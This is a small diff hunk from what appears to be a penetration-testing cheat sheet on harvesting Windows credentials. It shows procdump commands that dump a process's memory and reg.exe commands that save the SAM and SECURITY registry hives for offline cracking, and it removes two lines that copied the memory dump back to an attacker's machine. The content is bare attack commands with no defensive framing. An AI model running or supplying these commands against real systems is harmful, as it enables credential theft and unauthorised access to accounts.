@@ -26,9 +26,6 @@ Full Dump
 Mini Dump
 & 'C:\users\accountname\procdump64.exe' -accepteula -ma PIDorPROCESS dumpname.dmp
 
-transfer dmp back
-download C:\users\accountname\dumps\dumpname.dmp /root/downloads/dumpname.dmp
-
 Enumerate Windows System Creds without tools
 reg.exe save hklm\sam c:\sam_backup
 reg.exe save hklm\security c:\security_backup
